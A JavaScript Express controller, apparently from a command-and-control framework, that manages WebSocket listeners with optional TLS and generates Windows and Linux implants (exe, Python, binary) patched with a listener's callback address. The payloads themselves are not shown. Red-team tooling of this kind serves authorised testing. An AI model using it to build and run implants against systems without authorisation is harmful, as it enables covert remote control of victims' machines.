import { response } from "express";
import Listener from '../models/Listener_model.mjs';
import { fileURLToPath } from 'url';
import fs from 'fs'
import { rm } from 'fs/promises';
import  path from 'path';
import  {resolve} from 'path';
import { set_server, set_ssl_server } from "../Servers/http_servers.mjs";
import { writeLog } from "../Utils/writeLog.mjs";
import { bin_processing, exe_processing, python_processing } from "../Utils/implant_processing.mjs";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);


const create_listener = async (req, res = response, attacks_running, agents, status_connections, listeners) => {


    try {

        
        let { type = "ws", bind = "0.0.0.0", port = 0, url="localhost", ssl_tls=false} = req.body;
        
        port = Number(port);
        ssl_tls = Boolean(ssl_tls);

    

        if (type.length <= 0 || bind.length <= 0 || port === 0) {
            console.log("Fields shouldn't be empty");
            return res.status(400).json({
                ok: false,
                msg: "Fields shouldn't be empty"
            });
        }

        if (type != "ws" ) {
            console.log("Invalid type");
            return res.status(400).json({
                ok: false,
                msg: "Invalid type"
            });
        }


        const found_listener = await Listener.findOne({ type, port });

        if (found_listener) {
            console.log("Listener already exists");
            return res.status(400).json({
                ok: false,
                msg: "Listener already exists"
            })
        }

                
        if(ssl_tls){
            
            const files = req.files;
            
            if (!files.cert || !files.key){
                return res.status(400).json({
                    ok: false,
                    msg:"cert & key are required"
                })
            }
    
            const certBuffer = files.cert[0].buffer;
            const keyBuffer = files.key[0].buffer;
            let caBuffer=undefined;
            const date = new Date();
            const day = String(date.getDate()).padStart(2, '0');
            const month = String(date.getMonth() + 1).padStart(2, '0');
            const year = date.getFullYear();
            const timestamp = `${day}-${month}-${year}-${port}`;

            const name = path.basename(timestamp);
        
            const basePath = path.join(__dirname, '../certs');
            const newDirPath = path.join(basePath, name);
        
            // Crear carpeta
            fs.mkdir(newDirPath, { recursive: true }, (err) => {
                if (err) {
                    console.error(err);
                    return res.status(400).json({ ok: false, msg: err.message });
                }
            });
                
            
            if (certBuffer.length > 0 && keyBuffer.length > 0 ) {
                
                fs.writeFileSync(path.join(`${newDirPath}`, 'cert.pem'), certBuffer);
                fs.writeFileSync(path.join(`${newDirPath}`, 'key.pem'), keyBuffer);
                if(caBuffer){
                    fs.writeFileSync(path.join(`${newDirPath}/`), 'ca.pem', caBuffer);
                }
            }else{
                return res.status(400).json({ok:false, msg:"Size buffers errors"})
            }
            

            const new_listener = new Listener({  type, bind, url, port, ssl_tls, path_cert:newDirPath });
    
            await new_listener.save();

            const ssl_listener = await set_ssl_server(bind, port, newDirPath, attacks_running, agents, status_connections);
            listeners.listeners.push(ssl_listener);

            writeLog(` | New listener added in port ${port} `)
            
            return res.status(200).json({
                ok: true,
                msg: "New listener added"
            })

        }

        const new_listener = new Listener({  type, bind, url, port, ssl_tls });
        await new_listener.save();

        
        const listener = await set_server(bind, port, attacks_running, agents, status_connections);
        listeners.listeners.push(listener);

        writeLog(` | New listener added in port ${port} `)
        return res.status(200).json({
            ok: true,
            msg: "New listener added"
        })

    } catch (error) {
        console.log(error);
        return res.status(400).json({
            ok: false,
            msg: "Error creating listener"
        })
    }

}



const get_listener=async( req, res = response) => {

    
    try {
        
        const listeners = await Listener.find().select('bind type port url ssl_tls');

        return res.status(200).json({
            ok: true,
            listeners
        })
        
    } catch (error) {
        console.log(error);
        return res.status(400).json({
            ok: false,
            msg:"Error fetching listeners"
        })
    }

    
};



const delete_listener= async( req, res = response, listeners) => {

    
    try {
        const { type = "", bind = "", port_to_delete } = req.body; 
        
        if( type.length <=0 || bind.length <=0  ){
            return res.status(400).json({
                ok:false,
                msg:"Error fields"
            });
        }

        if( type != "ws"  ){
            console.log("Invalid type");
            return res.status(400).json({
                ok:false,
                msg:"Invalid type"
            });
        }

        
        const found_listener = await Listener.findOne({ port:port_to_delete })


        if (!found_listener){
            console.log("Listener doesn't exists");
            return res.status(400).json({
                ok:false,
                msg:"Listener doesn't exists"
            })
        }


        for(let i=0; i < listeners.listeners.length; i++){

            if(listeners.listeners[i].port === port_to_delete){
                const { http_server="", ws="", port=0 } = listeners.listeners[i];

                try {
                    http_server.close(()=> console.log(`Deleted http ${port}`))
                } catch (error) {

                    console.log("error deleting http", error);
                    return res.status(400).json({
                        ok:false,
                        msg: "error deleting http, maybe pending connections"
                    });
                }
                try {
                    ws.close(()=> console.log(`Deleted ws ${port}`))
                } catch (error) {
                    console.log("error deleting ws", error);
                    return res.status(400).json({
                        ok:false,
                        msg: "error deleting ws, maybe pending connections"
                    });
                }

                listeners.listeners.splice(i,1);
                break;
            }
        }
        

        await Listener.findByIdAndDelete(found_listener._id);

        
        try {
            const folder = resolve(found_listener.path_cert); 
            await rm(folder, { recursive: true, force: true });
        } catch (error) {
            console.error('Error deleting certs folder:', error);
        }


        return res.status(200).json({
            ok:true,
            msg:"Listener deleted"
        })
        
    } catch (error) {
        console.log(error);
        return res.status(400).json({
            ok:false,
            msg:"Error deleting listener"
        })
    }

    
};


const create_implant_controller = async(req, res=response)=>{

    try {
        const { type="", system="", listener=0, group="default" } = req.body;


        let implant_path="";

        switch (system) {
            case "linux":
                implant_path = `./Implants/linux`;
                break;
            case "windows":
                implant_path = `./Implants/windows`;
                break;
        
            default:
                return res.status(400).json({
                    ok: false,
                    msg: "Invalid system"
                })
        }


        const found_listener = await Listener.findOne({ port: listener });

        if (!found_listener) {
            console.log("Listener doesn't exists");
            return res.status(400).json({
                ok: false,
                msg: "Listener doesn't exists"
            })
        }


        if( !/^[\w\-]+$/.test(group) || !/^[\w\-]+$/.test(found_listener.url || !/^[\w\-]+$/.test(listener) ) ){
            return res.status(400).json({
                ok:false,
                msg:"Blocked due to malicious input"
            })
        }



        switch (found_listener.ssl_tls) {
            case true:
                implant_path = `${implant_path}/ssl`;
                break;
            case false:
                implant_path = `${implant_path}/no_ssl`;
                break;

            default:
                return res.status(400).json({
                    ok: false,
                    msg: "Invalid database listener type"
                })
        }


        let new_implant;

        switch (type) {
            case "exe":{
                implant_path = `${implant_path}/base.exe`;
                implant_path = path.normalize(implant_path);
                exe_processing(implant_path, found_listener.url, found_listener.port, group)
                break;
            }
            case "python":{
                implant_path = `${implant_path}/base.py`;
                implant_path = path.normalize(implant_path);
                new_implant = await python_processing(implant_path)
                break;
            }
            case "bin":{
                implant_path = `${implant_path}/base.bin`;
                implant_path = path.normalize(implant_path);
                new_implant = await bin_processing(implant_path)
                break;
            }
        
            default:
                return res.status(400).json({
                    ok: false,
                    msg: "Invalid type"
            })
        }


        return res.status(200).json({
            ok:true,
            msg:implant_path
        })





    } catch (error) {
        console.log(error);
        return res.status(400).json({
            ok:false,
            msg:"Server error"
        })
    }
}


export { create_listener, delete_listener, get_listener, create_implant_controller };